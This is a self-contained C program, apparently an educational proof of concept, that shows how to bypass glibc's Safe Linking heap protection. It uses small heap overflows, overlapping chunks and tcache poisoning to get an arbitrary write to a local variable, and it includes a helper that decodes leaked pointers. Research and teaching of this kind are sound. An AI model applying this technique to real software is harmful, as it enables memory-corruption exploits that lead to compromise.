#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

// Free and NULL out pointer, preventing UAF
#define SAFE_FREE(p) { free(p); p = NULL; }

// 1-byte overflow. Sets overflown chunk's mchunk_rev_size to 0x140 and
// mchunk_size to 0xa0 (clearing the PREV_INUSE flag)
char *payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x40\x01\x00\x00\x00\x00"
                "\x00\x00\xa0";

// 2-byte overflow. Sets overflown chunk's mchunk_size to 0x140
char *payload2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x41\x01";

// The variable we intend to overflow. The address of this variable
// is 0x10 aligned. See additional notes about writing to a
// non-0x10 aligned address
uint64_t screw_up_alignment = 0x4a4a4a4a;
uint64_t arbitrary_variable = 0x11111111;

// Decode a leaked P' value and recover the L >> 12 value
// used to encode an arbitrary pointer for that chunk.
uint64_t get_L12(uint64_t Pprime) {
    uint8_t Pprime_byte, xor_byte;
    uint64_t decoded = Pprime >> 36;

    for (size_t i = 0; i < 3; i++) {
        Pprime_byte = Pprime >> (28 - i*8);
        xor_byte = Pprime_byte ^ (decoded >> 4);
        decoded <<= 8;
        decoded |= xor_byte;
    }

    return decoded;
}

int bypass_demo() {
    void *tcache_allocs[7];

    printf("\nSafe Linking bypass using only a 2-byte heap buffer overflow\n\n"
           "Arbitrary variable address is %p and its value is 0x%lx\n",
           &arbitrary_variable, arbitrary_variable);

    printf("Allocating 7 items to fill the tcache when they are eventually freed...\n");
    for( int i = 0; i < 7; i++) {
        tcache_allocs[i] = malloc(0x98);
    }

    // Allocate A, B, C, and D into contiguous memory. The plans are:
    //    - A will be used for a buffer overflow into b, to overcome the
    //      "corrupted size vs. previous size while consolidating" mitigation
    //    - B will be freed legitimately into unsorted bin, and eventually
    //      consolidated with chunks C/D
    //    - C will become an overlapping chunk and leveraged into a coerced UAF
    //    - D will be corrupted by a legit buffer overflow, and freed into
    //      unsorted list and consolidated with b
    printf("Allocating 4 contiguous allocations (chunks A, B, C, D) to use "
           "for buffer overflows and overlapping chunks...\n");
    char *chunkA = malloc(0x98);
    char *chunkB = malloc(0x98);
    char *chunkC = malloc(0x98);
    char *chunkD = malloc(0xb8);

    printf("Freeing the 7 items so tcache is full...\n");
    for( int i = 0; i < 7; i++) {
        SAFE_FREE(tcache_allocs[i]);
    }

    printf("Freeing B (%p) into unsorted bin, since tcache is full.\n", chunkB);
    SAFE_FREE(chunkB);

    printf("\nNow simulating a buffer overflow vulnerability\n"
           "We will overflow from C (malloc(0x98)) into D (malloc(0xb8))\n"
           "We are only overflowing 2 bytes, writing a custom size into D (shorter than orig size).\n"
           "We are also overwriting the prev_size field to 0x140 so it will attempt to consolidate B, C, and D.\n");
    memcpy(chunkC, payload, 0x99);

    printf("\nSince chunkD is a usable buffer that we still have a pointer to, we create a fake chunk inside it.\n"
           "This is at the offset matching the custom size we just wrote.\n"
           "The 0x21 we write here represents a fake next chunk's size field, and satisfies two conditions:\n"
           "  - ends in 0x1 (setting PREV_IN_USE), and\n"
           "  - when added to the custom size we overwrote, actually lands on the legit next chunk after chunkD\n");
    chunkD[0x98] = '\x21';

    printf("\nNow, we have to trigger a second buffer overflow. This will be used to bypass some security checks\n"
           "performed when consolidating backwards. We must overwrite the original size of chunk B to match what\n"
           "chunk D is saying it is.\n");
    memcpy(chunkA, payload2, 0x9a);

    printf("\nFreeing chunk D (%p), causing it to consolidate everything from B, over C, and including up to\n"
           "the fake chunk boundary inside D.\n", chunkD);
    SAFE_FREE(chunkD);

    printf("\nOur tcache for this bin size is full, so allocating 7 more items to empty it...\n");
    for( int i = 0; i < 7; i++) {
        tcache_allocs[i] = malloc(0x98);
    }

    printf("The next allocation will be carved out from the consolidated chunk (B, C, and fake DD) in unsorted bin.\n");
    char *junk = malloc(0x98);
    printf("This new ptr should match chunk B above: %p\n", junk);

    printf("\nBy asking for another chunk of the same size as C we get...\n"
           "Two pointers to the same chunk! We have our original C, and this new C2.\n");
    char *chunkC2 = malloc(0x98);
    printf("\nChunk C is at %p and chunk C2 is at %p\n", chunkC, chunkC2);

    printf("\nWe are going to free one of those pointers (C2) which will put it in the emptied tcache bin.\n");
    SAFE_FREE(chunkC2);

    printf("PROTECT_PTR() is going to protect this chunk's fd ptr... which is NULL.\n"
           "Meaning it will do the L>>12 calculation, and XOR it with 0, writing L>>12 unmodified...\n"
           "Which we can recover using our original C pointer\n");
    uint64_t L12 = *(int64_t *)chunkC;
    printf("\nL >> 12 for chunk C is 0x%lx\n", L12);

    printf("\nNow we can use that to mask any arbitrary address we want (well, sort of, it does need to pass an alignment check),\n"
           "but since we'll be allocating a relatively large buffer (0x98), we can just round it down and then write at\n"
           "the necessary offset to get a truly arbitrary write-what-where\n");
    uint64_t masked_ptr = L12 ^ (((uint64_t) &arbitrary_variable) & ~0xf);
    printf("\nMasked arbitrary variable address is 0x%lx\n", masked_ptr);

    printf("\nWe need to put a legitimate chunk back in the tcache, so that our freed chunk can have its fd ptr overwritten.\n"
           "BUT we need to take out the C2 that we just freed into the tcache or else we'll trigger a double-free security\n"
           "check trying to put two copies of C in the tcache bin at the same time.\n");
    uint64_t *chunkC3 = malloc(0x98);
    printf("\nNow we have a C3 ptr (%p).\n", chunkC3);

    printf("\nFree one of the 7 tcache allocs we used to empty the tcache earlier...\n");
    SAFE_FREE(tcache_allocs[0]);

    printf("And put C3 back onto the tcache bin, and due to LIFO, C3->fd will point to a legitimate chunk.\n");
    SAFE_FREE(chunkC3);

    printf("Since we still have the original C ptr, we can now write the masked ptr to offset 0 of C and overwrite the\n"
           "fd ptr of the freed C3 in the tcache.\n");
    *(uint64_t *) chunkC = masked_ptr;
    
    printf("\nMalloc once to remove the C3 out of the LIFO...\n");
    char *junk2 = malloc(0x98);

    printf("\nAnd finally malloc one more time to get access to our arbitrary address.\n");
    uint64_t *winner = malloc(0x98);

    printf("This winning chunk is located at %p and we can write anything we want here...\n", winner);
    *(winner+1) = 0x112233445566;

    printf("\nArbitrary variable now contains 0x%lx\n", arbitrary_variable);
}

int main() {
    int command = 0;
    uint64_t input = 0;

    printf("Which would you like to see?\n\t1) P' decoder\n\t2) Safe Linking Bypass\n");
    command = getchar();

    switch(command) {
        case '1':
            printf("Enter hexadecimal P' value (without leading 0x): ");
            if (scanf(" %lx", &input) == 0) {
                printf("\nInvalid input\n");
                return 1;
            }
            printf("\nThe L >> 12 value for P' \"%lx\" is %lx\n", input, get_L12(input));
            break;

        case '2':
            bypass_demo();
            break;
        default:
            printf("Invalid input\n");
            return 1;
    }

    return 0;
    
}
